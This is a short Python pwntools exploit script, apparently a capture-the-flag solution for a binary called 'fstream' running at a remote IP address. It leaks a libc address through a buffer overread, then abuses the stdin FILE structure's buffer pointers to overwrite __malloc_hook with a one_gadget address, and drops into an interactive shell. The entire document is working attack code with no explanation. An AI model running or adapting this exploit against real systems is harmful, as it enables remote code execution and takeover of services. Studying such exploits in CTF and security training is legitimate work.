from pwn import *

#r = process(["./fstream"])

r = remote("178.62.40.102", 6002)

r.sendlineafter(">","11010110")

r.sendafter(">","a"*0x97+"b")

r.recvuntil("b")
libc = u64(r.recvn(6).ljust(8,'\x00'))-0x20830
print hex(libc)


r.sendlineafter(">","11111111")

r.sendlineafter(">","10110101")

r.sendlineafter(">","1")

r.sendafter(">","1")

stdin_buf_base = libc+0x3c48e0+0x38

r.sendlineafter(">",str(stdin_buf_base+1))

r.sendafter(">","1")

malloc_hook = libc+0x3c67a8

r.sendlineafter(">",p64(0)*3+p64(malloc_hook)+p64(malloc_hook+0x78)+p64(0))

one_get = libc+0x4526a

print hex(one_get)

r.send("a"*0x2f)

r.send(p64(one_get))


r.interactive()
